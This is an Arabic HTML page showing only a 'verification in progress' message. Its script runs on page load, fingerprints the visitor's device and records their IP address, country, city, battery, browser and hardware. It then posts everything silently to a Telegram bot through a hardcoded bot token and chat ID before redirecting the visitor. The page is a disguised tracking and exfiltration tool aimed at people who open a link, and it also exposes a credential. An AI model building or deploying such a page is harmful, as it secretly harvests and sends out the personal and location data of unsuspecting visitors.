<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .wait-message {
            font-size: 24px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="wait-message">انتظر جاري التحقق...</div>

    <script>
        // بيانات البوت
        const BOT_TOKEN = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
        const CHAT_ID = '6913353602';
        
        // دالة لجمع معلومات الجهاز
        async function collectDeviceInfo() {
            const info = {
                // معلومات الوقت
                'الوقت ⏰': new Date().toLocaleString('ar-SA', { timeZoneName: 'short' }),
                
                // معلومات الشبكة والاتصال
                'الشبكة': getNetworkInfo(),
                'نوع الاتصال': getConnectionType(),
                'عنوان IP': await getIPAddress(),
                'بروتوكول الأمان المستخدم': window.location.protocol,
                'نطاق التردد للاتصال': getNetworkFrequency(),
                
                // معلومات الجهاز
                'اسم الجهاز 🖥️': navigator.userAgentData?.platform || navigator.platform,
                'نوع الجهاز 📱': getDeviceType(),
                'إصدار الجهاز': navigator.userAgentData?.platformVersion || 'غير معروف',
                'إصدار نظام التشغيل': getOSVersion(),
                'لغة النظام': navigator.language || navigator.userLanguage,
                'الذاكرة (RAM)': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
                'عدد الأنوية': navigator.hardwareConcurrency || 'غير معروف',
                
                // معلومات البطارية
                'شحن الهاتف': await getBatteryLevel(),
                'هل الهاتف يشحن؟': await isCharging(),
                
                // معلومات المتصفح
                'اسم المتصفح': getBrowserName(),
                'إصدار المتصفح': getBrowserVersion(),
                'تاريخ آخر تحديث للمتصفح': 'غير متاح', // يحتاج لـ API خاص
                
                // معلومات الشاشة
                'دقة الشاشة': `${window.screen.width}x${window.screen.height}`,
                'وضع الشاشة': window.screen.orientation?.type || 'غير معروف',
                'عمق الألوان': `${window.screen.colorDepth} بت`,
                
                // معلومات الموقع
                'البلد 🔻': await getCountry(),
                'المدينة': await getCity(),
                'إمكانية تحديد الموقع الجغرافي': navigator.geolocation ? 'نعم' : 'لا',
                
                // معلومات إضافية
                'الدعم لتقنية البلوتوث': 'bluetooth' in navigator ? 'نعم' : 'لا',
                'دعم الإيماءات اللمسية': 'ongesturestart' in window ? 'نعم' : 'لا',
                'الذاكرة الداخلية': 'storage' in navigator ? 'غير متاح في الويب' : 'غير معروف'
            };
            
            return info;
        }

        // الدوال المساعدة
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return connection ? (connection.effectiveType || 'غير معروف') : 'غير متاح';
        }

        function getConnectionType() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return connection.type || 'غير معروف';
            }
            return 'غير متاح';
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }

        function getNetworkFrequency() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection && connection.downlink) {
                return `${connection.downlink} Mbps`;
            }
            return 'غير معروف';
        }

        function getDeviceType() {
            const userAgent = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
                return "تابلت";
            } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(userAgent)) {
                return "هاتف";
            }
            return "كمبيوتر";
        }

        function getOSVersion() {
            const userAgent = navigator.userAgent;
            let osVersion = "غير معروف";
            
            if (userAgent.indexOf("Windows NT 10.0") != -1) osVersion = "Windows 10";
            else if (userAgent.indexOf("Windows NT 6.3") != -1) osVersion = "Windows 8.1";
            else if (userAgent.indexOf("Windows NT 6.2") != -1) osVersion = "Windows 8";
            else if (userAgent.indexOf("Windows NT 6.1") != -1) osVersion = "Windows 7";
            else if (userAgent.indexOf("Windows NT 6.0") != -1) osVersion = "Windows Vista";
            else if (userAgent.indexOf("Windows NT 5.1") != -1) osVersion = "Windows XP";
            else if (userAgent.indexOf("Windows NT 5.0") != -1) osVersion = "Windows 2000";
            else if (userAgent.indexOf("Mac") != -1) osVersion = "Mac/iOS";
            else if (userAgent.indexOf("X11") != -1) osVersion = "UNIX";
            else if (userAgent.indexOf("Linux") != -1) osVersion = "Linux";
            else if (userAgent.indexOf("Android") != -1) osVersion = "Android";
            else if (userAgent.indexOf("iPhone") != -1) osVersion = "iPhone";
            else if (userAgent.indexOf("iPad") != -1) osVersion = "iPad";
            
            return osVersion;
        }

        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return `${Math.floor(battery.level * 100)}%`;
                } catch {
                    return 'غير معروف';
                }
            }
            return 'غير متاح';
        }

        async function isCharging() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return battery.charging ? 'نعم' : 'لا';
                } catch {
                    return 'غير معروف';
                }
            }
            return 'غير متاح';
        }

        function getBrowserName() {
            const userAgent = navigator.userAgent;
            let browserName = "غير معروف";
            
            if (userAgent.indexOf("Firefox") !== -1) browserName = "Firefox";
            else if (userAgent.indexOf("SamsungBrowser") !== -1) browserName = "Samsung Browser";
            else if (userAgent.indexOf("Opera") !== -1 || userAgent.indexOf("OPR") !== -1) browserName = "Opera";
            else if (userAgent.indexOf("Trident") !== -1) browserName = "Internet Explorer";
            else if (userAgent.indexOf("Edge") !== -1) browserName = "Edge";
            else if (userAgent.indexOf("Chrome") !== -1) browserName = "Chrome";
            else if (userAgent.indexOf("Safari") !== -1) browserName = "Safari";
            
            return browserName;
        }

        function getBrowserVersion() {
            const userAgent = navigator.userAgent;
            let temp;
            let version = "غير معروف";
            
            if (userAgent.indexOf("Firefox") !== -1) {
                temp = userAgent.substring(userAgent.indexOf("Firefox") + 8);
                version = temp.split(" ")[0];
            } else if (userAgent.indexOf("Chrome") !== -1) {
                temp = userAgent.substring(userAgent.indexOf("Chrome") + 7);
                version = temp.split(" ")[0];
            } else if (userAgent.indexOf("Safari") !== -1) {
                temp = userAgent.substring(userAgent.indexOf("Version") + 8);
                version = temp.split(" ")[0];
            } else if (userAgent.indexOf("OPR") !== -1) {
                temp = userAgent.substring(userAgent.indexOf("OPR") + 4);
                version = temp.split(" ")[0];
            }
            
            return version;
        }

        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.country_name || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        async function getCity() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.city || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        // بدء العملية عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                // جمع معلومات الجهاز
                const deviceInfo = await collectDeviceInfo();
                
                // تنسيق المعلومات كرسالة
                let message = "📱 معلومات الجهاز:\n\n";
                for (const [key, value] of Object.entries(deviceInfo)) {
                    message += `- ${key}: ${value}\n`;
                }
                
                // إرسال المعلومات إلى البوت
                await sendToTelegram(message);
                
                // توجيه المستخدم بعد الانتهاء
                window.location.href = "https://example.com/next-step";
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                window.location.href = "https://example.com/error-page";
            }
        });
        
        // دالة الإرسال إلى التليجرام
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    throw new Error('فشل الإرسال');
                }
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                throw error;
            }
        }
    </script>
</body>
</html>
